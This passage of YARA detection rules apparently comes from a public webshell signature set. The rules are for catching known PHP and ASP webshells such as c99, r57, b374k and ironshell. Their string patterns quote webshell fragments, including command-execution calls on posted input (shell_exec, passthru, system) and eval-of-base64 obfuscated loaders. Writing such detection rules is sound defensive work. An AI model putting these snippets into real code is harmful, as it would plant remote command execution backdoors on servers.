		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sqlquicklaunch[] = array(\""
		$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"

	condition:
		all of them
}

rule SIGNATURE_BASE__Antichat_Php_Php_Fatalshell_Php_Php_A_Gedit_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6bf5640f-0773-5d93-8d27-0844062017c7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5366-L5382"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "789340845aeed4accaef02afa1a1fe420e73b6f5af1b621f4ec2342994045278"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
		hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
		hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"

	strings:
		$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
		$s1 = "if($action==\"phpeval\"){" fullword
		$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
		$s3 = "$dir=getcwd().\"/\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__Crystal_Php_Nshell_Php_Php_Load_Shell_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a92134cd-7f10-589f-bcda-508bc7a20efe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5397-L5412"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "71a9310b19b66e3699f75f551cc604f535ea843eb9c50f4a009edcd9c11e01b9"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "0c5d227f4aa76785e4760cdcff78a661"

	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s1 = "$dires = $dires . $directory;" fullword
		$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Cybershell_Php_Php_Img_Php_Php_Nstview_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cc4dc0e9-dbb1-560b-ae36-23d3e16a407f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5413-L5429"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afc0b1c83644aa323d308471e5978b6b03f444f5f46fbaddac28ff42d524df1e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Dc3_Security_Crew_Shell_Priv_Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d22c4cc3-842b-5a24-bf4b-a8024b447b9e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5430-L5446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7a4c74912caa1855efc3a2ea7fa6d0082f62776d77a211e59f12892d4883f240"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "433706fdc539238803fd47c4394b5109"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
		$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_1_C2007_Php_Php_C100_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5447-L5462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a5dc73a12d8c8b89bab77b90cb3b561e9daf9db5f5ad550326a2fbce52c1c8da"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells_2_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5463-L5483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "26fe586ba7f4d1931b2df81aa27543ff422e699fd56b6b1be289a0f8d6954691"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash6 = "09609851caa129e40b0d56e90dfc476c"
		hash7 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
		$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
		$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5503-L5519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7ba3d6927dc06bfcd98ee9d7146164ca9a9024ef26eac60fabc8ed1375db618d"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Remexp_Asp_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "274c8816-2711-5f12-937e-549ec2d57ce1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5571-L5586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
		logic_hash = "b3cfa44898629ffa20630436ae10a94ad72f0e793d61e1157a4de649aa048fe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv_1
{
	meta:
		description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c83bb4ba-6b4e-5a88-925b-b93d08b304e4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5587-L5603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
		logic_hash = "f93a5d87d4a490844de578067dc0b7bac6b01ceb9130cd7c70a227566e18f16c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
		$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
		$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
		$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker_1
{
	meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2408fad8-780f-50de-a309-99d14a1d87b6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5604-L5622"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
		logic_hash = "323b68f1d31df647775ad16a85b9f90bce4eac89188160a1e4853f8fec680160"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Dtool_Pro_1
{
	meta:
		description = "PHP Webshells Github Archive - file DTool Pro.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9f2922d1-b2af-58ae-b194-ecb33577effa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5623-L5641"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
		logic_hash = "da744efb521415fb8817c0982d8d538e1e38b1c0995f43716611df37bf371c38"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
		$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
		$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
		$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
		$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
		$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
		$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
		$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Ironshell_4_1
{
	meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "06e87e02-372b-5d4e-be52-5515a068665b"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_ironshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5642-L5661"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
		logic_hash = "1810071f261ad7390532b07ef24115726f236131aa8ffd29adbde9ebe5085e9d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Indexer_Asp_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "d6e17429-1b58-5a1b-846d-f5dbfd74cf3a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5662-L5678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
		logic_hash = "c576925c95b5bd2549e8039a1fc6ac228bfab5ddee8c4e12264ea78e9828ba5c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Toolaspshell_1
{
	meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "016af030-4991-583c-aab5-a2933ae0eeec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5679-L5692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
		logic_hash = "cb46d3170a9c144a22ef8c91b381495a471d2aa178a4a123eb9a1e32e1db7683"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Mini_Shell_Php_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d5b0dfa5-46b5-5323-a8e8-b119d8c2c8e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5693-L5706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
		logic_hash = "553bd775d9662f9410d9ab946ccffe4b2ee92e367bcc6345fa595527653280cf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Sincap_1_0_1
{
	meta:
		description = "PHP Webshells Github Archive - file Sincap 1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "38d39739-660f-596d-a297-1f0dfe530797"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5707-L5722"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
		logic_hash = "0cb8851285bd55b0b613ec4c46ab88142e2cbba7e527ad510b008cfb342af221"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
		$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
		$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
		$s12 = "while (($ekinci=readdir ($sedat))){" fullword
		$s19 = "$deger2= \"$ich[$tampon4]\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "73eb7d8d-14bb-5bc2-90b2-90b6bd603bd1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5723-L5738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
		logic_hash = "f44ecdcf327cf417a90a91c8d23f6137b80c2006bea2ca2e214f2bfdf5793771"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_1
{
	meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3e0bae7d-77a1-5439-bbe7-177bec23cea0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5739-L5756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
		logic_hash = "63ebb0c673a5aee05d2d9d571ebf63942d826b5148a5f7ed587ba1efbb0dc923"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell_1
{
	meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5775-L5793"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
		logic_hash = "2c39ffecb44ce2f936ba3563c6086d8b2ed75aec3b57b45e2a1f5e7321ac9a3f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Pws_1
{
	meta:
		description = "PHP Webshells Github Archive - file pws.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5794-L5810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
		logic_hash = "4b2eeb80200cc5dffa80cddc74f1902c0e8a5d2313d9a20d02eeb99ccb668ec0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if ($_POST['cmd']){" fullword
		$s7 = "$cmd = $_POST['cmd'];" fullword
		$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
		$s11 = "if (file_exists($uploaded)) {" fullword
		$s12 = "copy($uploaded, $dez);" fullword
		$s17 = "passthru($cmd);" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_Reader_Asp_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "80ec18e1-6f41-5188-b2d5-f4228c975fa1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5811-L5825"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
		logic_hash = "6ffda38584b6cdec818af8e09c62bb4a46f40230ffd5c1a68993a91c37f67680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_3_1
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "349cf6ac-92b3-59f7-a6e4-c23e69b454c6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5826-L5843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
